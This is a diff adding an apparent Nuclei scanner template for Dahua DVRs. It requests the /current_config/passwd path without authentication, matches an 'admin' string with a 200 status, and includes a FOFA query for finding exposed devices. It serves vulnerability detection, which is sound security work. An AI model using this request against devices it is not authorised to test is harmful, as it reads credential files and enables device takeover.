@@ -1,0 +1,24 @@
+id: dahua-dvr-anyuser-login
+
+info:
+  name: Dahua Dvr Anyuser Login
+  author: zp857
+  severity: high
+  tags: dvr,anyuser-login
+  metadata:
+    fofa-query: 'app="dahua-DVR"'
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/current_config/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "admin"
+
+      - type: status
+        status:
+          - 200
